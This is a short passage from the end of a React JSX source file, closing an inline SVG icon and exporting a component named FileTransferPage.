    <line x1="12" x2="12" y1="22" y2="18"></line>
  </svg>
);

export default FileTransferPage;


